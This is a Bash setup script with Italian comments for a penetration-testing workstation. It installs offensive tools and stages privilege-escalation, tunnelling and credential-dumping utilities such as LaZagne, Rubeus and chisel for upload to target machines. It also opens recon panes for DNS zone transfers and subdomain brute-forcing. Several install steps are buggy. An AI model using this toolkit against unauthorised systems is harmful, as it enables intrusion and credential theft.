#!/bin/bash
# contiene:
# - le funzioni comuni
# - la richiesta dei parametri utente
# - la creazione delle cartelle di progetto
source "common"

open_terminal() {
    # Determina il terminale da utilizzare in base al sistema operativo
    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal --tab -e "$1"
    elif command -v konsole &>/dev/null; then
        konsole --new-tab -e "$1"
    elif command -v xterm &>/dev/null; then
        xterm -e "$1"
    elif command -v qterminal &>/dev/null; then
        qterminal -e "$1"
    else
        # Nessun terminale specifico trovato, apre una nuova finestra di terminale di default
        echo "No specific terminal found. Default terminal opening."
        x-terminal-emulator -e "$1"
    fi
}

while true
do
    echo ""
    echo ""    
    echo "Select actions on [$site]:"
    echo "1. Userful Tool: install usefull tools for penetration test."
    echo "2. Information Gathering: OSINT from web + active scan from cmd"
    echo "3. Information Gathering (WEB): Info from WEB, site structure, API, CMS, etc."
    echo "4. Service Information Gathering: nmap scan"    
    echo "5. Vulnerability: duckduckgo, searchsploit, nessus, nikto, etc"
    echo "6. Service AuthN bypass: ssh, ftp, smtp,  etc (TBD)"
    echo "7. Service AuthN bypass (WEB): brute force, command injection"
    echo ""
    read -p "Enter the number of the desired action (0 to exit): " choice





    case $choice in
        0)
            echo "I'm exiting the tool"
            echo "See you next game..."
            echo ""
            break
            ;;
        1)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEAPONIZATION
######################
######################
# Parametri
folderLin="/opt/_lin"
folderWin="/opt/_win"

# Funzione per verificare se un programma è installato
is_installed() {
    local program="$1"
    if command -v "$program" &> /dev/null; then
	return 0 # Installato
    else
	return 1 # Non installato
    fi
}

    echo ""
    echo "1. Kali Linux: tools to install on kali linux to be more powerful."
    echo "2. target Linux: userful tool to upload to a target machine with linux OS type."
    echo "3. target Windows: userful tool to upload to a target machine with windows OS type."     
    echo "4. Return to main manu"    
    echo ""   
    read -p "Enter the number of the desired action (0 to return Main Menu): " instachoice
    case $instachoice in
        4)
        ;;
        1)
# ===
# === APPLICAZIONI DA INSTALLARE SU KALI
# ===

echo " ==="
echo " === Tools to be installed on kali ==="
echo " ==="
# aggiornamento apt
printf "\n===================================\n"
printf "Check for apt updates\n\n"
sudo apt update


# Configure tmux
printf "\n===================================\n"
printf "Configure tmux\n\n"
# Define the tmux configuration file path
TMUX_CONF="$(readlink -f ~/.tmux.conf)"
# Define the configuration line to add
LINE='bind-key C-n run-shell "tmux kill-session -t #{session_name}"'

# Check if the tmux configuration file exists
if [ ! -f "$TMUX_CONF" ]; then
    # If the file doesn't exist, create it and add the configuration line
    sudo touch "$TMUX_CONF"
    echo "$LINE" > "$TMUX_CONF"
    echo "File $TMUX_CONF created and configuration added."
else
    # If the file exists, check if the configuration line is already present
    if ! grep -Fxq "$LINE" "$TMUX_CONF"; then
        # If the line is missing, append it to the file
        echo "$LINE" >> "$TMUX_CONF"
        echo "Configuration added to $TMUX_CONF."
    else
        # If the line already exists, do nothing
        echo "Configuration already exists in $TMUX_CONF."
    fi
fi



# webDataExtractor
program="webDataExtractor.py"
printf "\n===================================\n"
pathAppo="/opt/webDataExtractor/"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /opt
	sudo pip install beautifulsoup4
	sudo git clone https://github.com/dokDork/webDataExtractor.git
	cd /opt/webDataExtractor/
	chmod 755 webDataExtractor.py
fi

# username_anarchy
program="username-anarchy"
printf "\n===================================\n"
pathAppo="/opt/username-anarchy"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /opt
	sudo git clone https://github.com/urbanadventurer/username-anarchy.git
	cd /opt/username-anarchy
	sudo chmod 755 username-anarchy
fi

#LFI (LFIxplorer)
printf "\n===================================\n"
program="LFIxplorer"
if [ -d "/opt/LFIxplorer" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo git clone https://github.com/dokDork/LFIxplorer.git
	cd LFIxplorer 
	chmod 755 LFIxplorer.py 
fi

#chain-genrator (LFI)
program="php_filter_chain_generator"
printf "\n===================================\n"
pathAppo="/opt/php_filter_chain_generator"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /opt
	sudo git clone https://github.com/synacktiv/php_filter_chain_generator
	cd php_filter_chain_generator
	sudo chmod 755 php_filter_chain_generator.py
fi

# seclists
program="seclists"
printf "\n===================================\n"
if ! is_installed "$program"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /usr/share
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# xclip
program="xclip"
printf "\n===================================\n"
if ! is_installed "$program"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi


# impacket
printf "\n===================================\n"
program="python3-impacket"
pathAppo="/usr/share/doc/python3-impacket/examples"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
fi

# mingw-w64
printf "\n===================================\n"
program="mingw-w64"
if ! is_installed "i686-w64-mingw32-gcc"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	cd /opt
	sudo apt-get install $1
else
	echo "[i] $program is already installed."
fi

# memcstat (memchached)
printf "\n===================================\n"
program="memcstat"
if ! is_installed "memcstat"; then
	echo "[->] Installing $program..."
	# Comando di installazione del programma
	# Esempio: sudo apt-get install -y "$program"
	sudo apt install libmemcached-tools
else
	echo "[i] $program is already installed."
fi

# mongosh
printf "\n===================================\n"
program="mongosh"
if ! is_installed "mongosh"; then
	echo "[->] Installing $program..."
	sudo apt install nodejs npm
	sudo npm install -g mongosh
else
	echo "[i] $program is already installed."
fi

# script nmap
printf "\n===================================\n"
program="nmap script (vulnscan, vulners)"
pathAppo="/usr/share/nmap/scripts/vulscan"
if [ -d "$pathAppo" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."
	cd /usr/share/nmap/scripts/
	sudo git clone https://github.com/vulnersCom/nmap-vulners.git
	sudo git clone https://github.com/scipag/vulscan.git
	cd /usr/share/nmap/scripts/vulscan/
	chmod +x update.sh
	sudo ./update.sh
fi

#Nessus
printf "\n===================================\n"
program="nessus"
if [ -d "/opt/nessus" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo mkdir nessus
	cd nessus
	sudo wget 'https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/24332/download?i_agree_to_tenable_license_agreement=true' -O Nessus_amd64.deb
	sudo chmod 755 ./Nessus_amd64.deb
	sudo dpkg -i ./Nessus_amd64.deb
fi

#Evil-WinRM script
printf "\n===================================\n"
program="evil-winrm"
if [ -d "/opt/evil-winrm" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo mkdir evil-winrm
	cd evil-winrm
	sudo git clone https://github.com/samratashok/nishang.git
	sudo git clone https://github.com/PowerShellMafia/PowerSploit.git

fi

#lib_mysqludf_sys (mysql)
printf "\n===================================\n"
program="lib_mysqludf_sys"
if [ -d "/opt/lib_mysqludf_sys" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo git clone https://github.com/mysqludf/lib_mysqludf_sys.git
	cd lib_mysqludf_sys/
	sudo apt update && sudo apt install default-libmysqlclient-dev
	#sudo rm -f lib_mysqludf_sys.so
	#sudo rm -f Makefile
	#sudo sh -c 'echo "LIBDIR=/usr/lib\ninstall:\n\tgcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o \$(LIBDIR)/lib_mysqludf_sys.so" > ./Makefile-mysql'
	#sudo sh -c 'echo "LIBDIR=/usr/lib\ninstall:\n\tgcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so" > ./Makefile-mariadb'	
fi

# kitrunner (analisi API)
printf "\n===================================\n"
program="kr"
if is_installed "/opt/kitrunner/$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/kitrunner
	cd /opt/kitrunner
	sudo wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kiterunner_1.0.2_linux_386.tar.gz
	sudo gunzip kiterunner_1.0.2_linux_386.tar.gz
	sudo tar -xvf kiterunner_1.0.2_linux_386.tar 
	sudo chmod 755 ./kr
fi


# uniscan (automatizzo il command injection)
printf "\n===================================\n"
program="uniscan"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install uniscan
fi

# juumscan (automatizzo l'analisi delle vulnerabilità di joomla)
printf "\n===================================\n"
program="joomscan"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install joomscan
fi

# rlwrap
printf "\n===================================\n"
program="rlwrap"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install rlwrap
fi

# wister
printf "\n===================================\n"
program="wister"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install pipx
	pipx ensurepath
	pipx install wister
fi

# droopescan (automatizzo l'analisi delle vulnerabilità di drupal)
printf "\n===================================\n"
program="droopescan"
cd /opt
if [ -d "/opt/droopescan" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo mkdir /opt/droopescan
	sudo chown -R $USER:$USER /opt/droopescan
	sudo python3 -m venv /opt/droopescan  
	source /opt/droopescan/bin/activate  
	pip install droopescan
fi

# JDWP
printf "\n===================================\n"
program="jdwp-shellifier"
cd /opt
if [ -d "/opt/jdwp-shellifier" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo sudo git clone https://github.com/IOActive/jdwp-shellifier.git
fi

printf "\n===================================\n"
program="cupp"
if is_installed "cupp"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install cupp
fi


# cmsmap (bruteforce su Joomla, WOrdpress e Drupal)
printf "\n===================================\n"
program="cmsmap"
cd /opt
if [ -d "/opt/CMSmap" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo  git clone https://github.com/Dionach/CMSmap
	cd /opt/CMSmap 
	sudo pip3 install .
fi

# dirsearch (search directory)
printf "\n===================================\n"
program="dirsearch"
cd /opt
if is_installed "dirsearch"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo apt-get install dirsearch
fi


# whatwaf (WAF detection)
printf "\n===================================\n"
program="whatweb"
cd /opt
if is_installed "whatweb"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install whatweb
fi

# fromWord2Site
printf "\n===================================\n"
program="fromWord2Site"
cd /opt
if [ -d "/opt/fromWord2Site" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo git clone https://github.com/dokDork/fromWord2Site.git
	cd /opt/fromWord2Site
	sudo chmod 755 fromWOrd2Site.py
fi

# identYwaf
printf "\n===================================\n"
program="identYwaf"
cd /opt
if is_installed "identYwaf"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo git clone --depth 1 https://github.com/stamparm/identYwaf.git
	cd /opt/identYwaf
	sudo chmod 755 identYwaf.py
fi

# Synk e copilot
printf "\n===================================\n"
echo "[A] Synk e Copilot can not be installed automatically."
echo "    Please refer to:"
echo "    https://github.com/IppSec/parrot-build"


# Docker
printf "\n===================================\n"
program="docker"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo sudo apt install docker.io -y
fi


# redis-rogue-server + RedisModules-ExecuteCommand
printf "\n===================================\n"
program="redis-rogue-server"
cd /opt
if [ -d "/opt/redis-rogue-server" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo git clone https://github.com/LoRexxar/redis-rogue-server.git
	cd /opt
	sudo git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
	cd RedisModules-ExecuteCommand
	sudo make
	sudo mv /opt/RedisModules-ExecuteCommand/module.so /opt/redis-rogue-server/exp.so
fi

# hakluke/hakrawler
printf "\n===================================\n"
program="hakluke/hakrawler"
cd /opt
if [ -d "/opt/hakrawler" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/hakrawler
	cd /opt/hakrawler
	sudo git clone https://github.com/hakluke/hakrawler
	cd hakrawler
	sudo docker build -t hakluke/hakrawler .
fi

# sxcurity/gau
printf "\n===================================\n"
program="sxcurity/gau"
cd /opt
if [ -d "/opt/gau" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/gau
	cd /opt/gau
        sudo docker run --rm sxcurity/gau:latest –help
fi


# sublist3r (OSINT: subdomain)
printf "\n===================================\n"
program="sublist3r"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install sublist3r
fi


# crtsh (OSINT: subdomain)
printf "\n===================================\n"
program="crtsh"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo touch /usr/bin/crtsh
	sudo chmod 777 /usr/bin/crtsh
	sudo echo 'curl -s https://crt.sh/\?cn\=%.$1\&output=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u' > /usr/bin/crtsh
	sudo chmod 755 /usr/bin/crtsh
fi


# subfinder (OSINT: subdomain)
printf "\n===================================\n"
program="subfinder"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install gccgo-go 
	sudo apt install golang-go
	go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
	sudo apt install subfinder
fi


# spiderfoot (OSINT: info)
printf "\n===================================\n"
program="spiderfoot"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install spiderfoot
fi


# metagoofil (OSINT: meta info)
printf "\n===================================\n"
program="metagoofil"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install metagoofil
fi


# ZAP (vulnerability assessment)
printf "\n===================================\n"
program="zap"
if [ -d "/opt/gau" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/zap && sudo wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_unix.sh -O /opt/zap/zap.sh && sudo chmod +x /opt/zap/zap.sh
fi


# crackmapexec
printf "\n===================================\n"
program="crackmapexec"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt-get install crackmapexec
fi


# impacket
printf "\n===================================\n"
program="impacket"
if is_installed "$program-smbexec"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt-get install python3-impacket
fi

# git-dumper
printf "\n===================================\n"
program="git-dumper"
if [ -d "/opt/git_stuff" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install python3 python3-pip
	sudo apt install python3.13-venv
	cd /opt
	sudo python3 -m venv git_stuff
	source /opt/git_stuff/bin/activate
	pip install git-dumper
fi

# gitleaks
printf "\n===================================\n"
program="gitleaks"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install gitleaks
fi

# kerbrute 
printf "\n===================================\n"
program="kerbrute"
if is_installed "kerbrute"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install pipx
	pipx install kerbrute
	pipx ensurepath 
fi

# trufflehog 
printf "\n===================================\n"
program="trufflehog"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install trufflehog
fi

# gxfr (DNS tool)
printf "\n===================================\n"
program="gxfr"
cd /opt
if [ -d "/opt/gxfr" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/gxfr
	cd /opt/gxfr
	sudo wget https://raw.githubusercontent.com/leonteale/pentestpackage/master/gxfr.py
fi

# SNMP (Enyx)
printf "\n===================================\n"
program="enyx"
cd /opt
if [ -d "/opt/enyx" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo mkdir /opt/enyx
	cd /opt/enyx
	sudo git clone https://github.com/trickster0/Enyx.git
fi

# SNMP (snmp-mibs-downloader)
printf "\n===================================\n"
program="snmp-mibs-downloader"
cd /opt
if dpkg -l | grep -q snmp-mibs-downloader; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install -y snmp-mibs-downloader
	# Uncomment the 'mibs' line in snmp.conf
	if grep -q '^#mibs:' /etc/snmp/snmp.conf; then
	  echo "Uncommenting the 'mibs' line in /etc/snmp/snmp.conf"
	  sudo sed -i 's/^#mibs:/mibs:/' /etc/snmp/snmp.conf
	else
	  echo "The line '#mibs:' was not found in /etc/snmp/snmp.conf"
	  echo "Checking if the 'mibs:' line exists with a different comment character."
	    if grep -q '^; *mibs' /etc/snmp/snmp.conf; then
	      echo "Uncommenting the 'mibs' line in /etc/snmp/snmp.conf using the ';' symbol."
	      sudo sed -i 's/^; *mibs/mibs/' /etc/snmp/snmp.conf
	    else
	      echo "Adding the 'mibs:' line to the end of the /etc/snmp/snmp.conf file"
	      sudo echo "mibs:" >> /etc/snmp/snmp.conf
	    fi
	fi
fi

# SNMP (snmpwalk) 
printf "\n===================================\n"
program="snmpwalk"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install git snmpwalk
fi

# SNMP (snmpenum) 
printf "\n===================================\n"
program="snmpenum"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install git snmpenum
	sudo mkdir /opt/snmpenum
	cd /opt/snmpenum/
	sudo wget https://gitlab.com/kalilinux/packages/snmpenum/-/blob/kali/master/linux.txt
	sudo wget https://gitlab.com/kalilinux/packages/snmpenum/-/blob/kali/master/cisco.txt
	sudo wget https://gitlab.com/kalilinux/packages/snmpenum/-/blob/kali/master/windows.txt
fi

# finger-user-enum (finger enumeration)
printf "\n===================================\n"
program="finger-user-enum"
cd /opt
if [ -d "/opt/finger-user-enum" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo mkdir finger-user-enum
	cd finger-user-enum
	sudo git clone https://github.com/pentestmonkey/finger-user-enum
	cd finger-user-enum
	sudo chmod 755 finger-user-enum.pl
fi

# thc-hydra
printf "\n===================================\n"
program="thc-hydra"
cd /opt
if [ -d "/opt/thc-hydra" ]; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	cd /opt
	sudo git clone https://github.com/vanhauser-thc/thc-hydra.git
	sudo cd thc-hydra
	sudo apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk 2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird-dev libmemcached-dev libgpg-error-dev libgcrypt11-dev libgcrypt20-dev
	sudo apt install libsmbclient-dev
	cd /opt/thc-hydra/
	sudo ./configure
	sudo make
	sudo make install
fi

# SVN TOOLs 
printf "\n===================================\n"
program="svn"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install git git-svn subversion
fi

# SVN TOOLs 
printf "\n===================================\n"
program="gdb"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install gdb
	sudo apt install gdb-minimal
fi

# odat (Oracle)
printf "\n===================================\n"
program="odat"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install odat
fi

# patator (oracle)
printf "\n===================================\n"
program="patator"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install patator
fi

# shell Nishang 
printf "\n===================================\n"
program="nishang"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install nishang
fi

# sqlplus (Oracle) 
printf "\n===================================\n"
program="sqlplus"
if is_installed "$program"; then
	echo "[i] $program is already installed."
else
	echo "[->] Installing $program..."	
	sudo apt install oracle-instantclient-sqlplus
	sudo apt-get install libaio1
	sudo apt autoremove
fi



        ;;
        2)
# ===
# === APPLICAZIONI PER TARGET LINUX
# ===
echo ""
echo ""
echo " ==="
echo " === Utilità per Target Linux ==="
echo " ==="

# Verifica se la cartella esiste
if [ ! -d "$folderLin" ]; then
    sudo mkdir -p "$folderLin"
    echo "[i] Cartella $folderLin creata con successo"
else
    echo "[i] La cartella $folderLin esiste già."
fi

#File singoli da scaricare nella cartella
cd $folderLin
# Crea il file download.txt con 10 URL
sudo touch download.txt
echo "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" | sudo tee -a download.txt
echo "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" | sudo tee -a download.txt
echo "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" | sudo tee -a download.txt
echo "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" | sudo tee -a download.txt
echo "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" | sudo tee -a download.txt
echo "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" | sudo tee -a download.txt
echo "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap" | sudo tee -a download.txt
echo "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nping" | sudo tee -a download.txt
echo "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" | sudo tee -a download.txt
echo "https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_386.gz" | sudo tee -a download.txt
echo "https://github.com/hugsy/gdb-static/raw/master/gdb-7.10.1-x32" | sudo tee -a download.txt

# Scarica i file utilizzando wget
printf "\n===================================\n"
echo "[i] Interesting Application download"
sudo wget -N -i download.txt

#completo l'installazione di chisel
printf "\n===================================\n"
echo "[i] chisel installation"
sudo gunzip chisel_1.7.4_linux_386.gz 
sudo mv chisel_1.7.4_linux_386 chisel 
sudo chmod 755 *
sudo upx brute chisel










            ;;
        3)
# ===
# === APPLICAZIONI PER TARGET WINDOWS
# ===
echo ""
echo ""
echo " ==="
echo " === Utilità per Target Windows ==="
echo " ==="

# Verifica se la cartella esiste
if [ ! -d "$folderWin" ]; then
    sudo mkdir -p "$folderWin"
    echo "[i] Cartella $folderWin creata con successo"
else
    echo "[i] La cartella $folderWin esiste già."
fi

#File singoli da scaricare nella cartella
cd $folderWin
# Crea il file download.txt con 10 URL
cat << EOF > download.txt
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEAS.bat
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe
https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx86.exe
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nmap.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nping.exe
https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_windows_386.gz
EOF
# Scarica i file utilizzando wget
printf "\n===================================\n"
echo "[i] Interesting Application Download"
wget -N -i download.txt

#completo l'installazione di chisel
printf "\n===================================\n"
echo "[i] chisel installation"
sudo gunzip chisel_1.7.4_windows_386.gz 
sudo mv chisel_1.7.4_windows_386 chisel.exe 
sudo upx brute chisel.exe

# SharpCollection
printf "\n===================================\n"
echo "[i] sharpCollection installation"
sudo git clone https://github.com/Flangvik/SharpCollection.git

# samdump, pwdump, procdump
#SAMDUMP2
printf "\n===================================\n"
echo "[i] samdump2 installation"
sudo apt install samdump2
# PWDUMP
printf "\n===================================\n"
echo "[i] Pwdump installation"
sudo wget -N https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
sudo unzip -o pwdump8-8.2.zip
sudo chmod 755 ./pwdump8
sudo chmod 755 ./pwdump8/*
# PROCDUMP
printf "\n===================================\n"
echo "[i] ProcDump installation"
sudo wget -N https://download.sysinternals.com/files/Procdump.zip
sudo unzip -o Procdump.zip
sudo chmod 755 *
# Rubeus.exe
printf "\n===================================\n"
echo "[i] ProcDump installation"
sudo wget -N https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Rubeus.exe
sudo unzip -o Rubeus.exe
sudo chmod 755 *


;;
esac
;;            
            
            
            
            

        2)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Information Gathering: OSINT from web, active scan from cmd"
######################
######################
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectInfoGathering" Enter


# INFORMATION GATHERING
cd $folderProjectInfoGathering
# OSINT multifunctional websites
# Layout
tmux new-window -t PT:1 -n 'OSINT: multifunctional websites'
tmux split-window -v -t PT:1.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# OSINT: multifunctional websites" Enter
tmux send-keys -t PT:1.0 "grep -v '^#' $folderProjectEngine/osint-web-multifunzione.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT subdomain searcher
# Layout
tmux new-window -t PT:2 -n 'OSINT: subdomain searcher'
tmux split-window -v -t PT:2.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# OSINT: subdomain searcher" Enter
tmux send-keys -t PT:2.0 "grep -v '^#' $folderProjectEngine/osint-web-subdomain.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: IP Neighbour searcher
# Layout
tmux new-window -t PT:3 -n 'OSINT: IP Neighbour searcher'
tmux split-window -v -t PT:3.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# OSINT: IP Neighbour searcher" Enter
tmux send-keys -t PT:3.0 "grep -v '^#' $folderProjectEngine/osint-web-ip.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: site Technology
# Layout
tmux new-window -t PT:4 -n 'OSINT: site Technology'
tmux split-window -v -t PT:4.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# OSINT: site Technology" Enter
tmux send-keys -t PT:4.0 "grep -v '^#' $folderProjectEngine/osint-web-site.txt | xargs -I {} xdg-open {}"
cd $folderProject

cd $folderProjectInfoGathering
# OSINT: DNS data exfiltration
# Layout
tmux new-window -t PT:5 -n 'OSINT: DNS data exfiltration'
tmux split-window -v -t PT:5.0
tmux select-pane -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -v -t PT:5.5
tmux select-pane -t "5.5"
tmux split-window -h -t "5.5"
tmux split-window -v -t PT:5.7
tmux select-pane -t "5.7"
tmux split-window -h -t "5.7"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with webSite" Enter
tmux send-keys -t PT:5.0 "grep -v '^#' $folderProjectEngine/osint-web-dns.txt | xargs -I {} xdg-open {}"
tmux send-keys -t PT:5.1 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with dnsrecon" Enter
tmux send-keys -t PT:5.1 "dnsrecon -d $domain"
tmux send-keys -t PT:5.2 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with host" Enter
tmux send-keys -t PT:5.2 "host -t a $site && host -t aaaa $site && host -t mx $site && host -t ns $site && host -t ptr $ip"
tmux send-keys -t PT:5.3 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with nslookup" Enter
tmux send-keys -t PT:5.3 "nslookup $site && nslookup $ip"
tmux send-keys -t PT:5.4 "# OSINT: DNS record (A,MX,NS,...) data exfiltration with dnsenum" Enter
tmux send-keys -t PT:5.4 "dnsenum $domain"
tmux send-keys -t PT:5.5 "# OSINT: DNS Zone Transfer with dig" Enter
tmux send-keys -t PT:5.5 "dig axfr $domain"
tmux send-keys -t PT:5.6 "# OSINT: DNS Zone Transfer with dnsrecon" Enter
tmux send-keys -t PT:5.6 "dnsrecon -t axfr -n $ip -d $domain"
tmux send-keys -t PT:5.7 "# OSINT: DNS SubDomain research" Enter
tmux send-keys -t PT:5.7 "python2 /opt/gxfr/gxfr.py --gxfr --dns-lookup"
tmux send-keys -t PT:5.8 "# OSINT: DNS SubDomain research" Enter
tmux send-keys -t PT:5.8 "dnsrecon -t brt -D /usr/share/dnsrecon/namelist.txt -d $domain"
cd $folderProject

cd $folderProjectInfoGathering
